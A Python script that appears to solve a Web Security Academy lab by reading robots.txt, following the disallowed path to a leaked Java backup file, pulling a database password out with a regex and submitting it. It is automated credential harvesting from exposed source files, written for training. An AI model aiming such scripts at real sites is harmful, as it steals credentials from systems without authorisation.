from web_security_academy.core.utils import *
from urllib.parse import urljoin
import re


def solve_lab(session):
    # robots.txt
    print_info(f'Visiting "/robots.txt"...')
    resp = session.get_path("/robots.txt")
    if resp.status_code != 200:
        print_fail(f"Unable to visit path.")
    else:
        print_success("GET request came back with the following response:\n")
        print(resp.text)

    # Extracting and visiting /backup
    match = re.search(r"Disallow: (.*)\n", resp.text)
    if match is None:
        print_fail("Unable to find backup path.")
    else:
        backup_path = match.group(1)

    print_info(f'Visiting "{backup_path}"...')
    resp = session.get_path(backup_path)
    if resp.status_code != 200:
        print_fail(f"Unable to visit path.")
    else:
        print_success("GET request came back with the following response:\n")
        print(resp.text)

    # Extracting password from /backup/ProductTemplate.java.bak
    soup = BeautifulSoup(resp.text, "lxml")
    query = soup.select_one("a")
    if query is None:
        print_fail("Unable to find leaked source code.")
    else:
        href = query.get("href")

    print_info(f'Extracting database password from "{href}"...')
    resp = session.get_path(href)
    query = re.search(r'"([a-z0-9]{32})', resp.text)
    if query is None:
        print_fail("Unable to extract database password.")
    else:
        password = query.group(1)
        print_success(f"Database password: {password}\n")

    session.submit_solution(password)
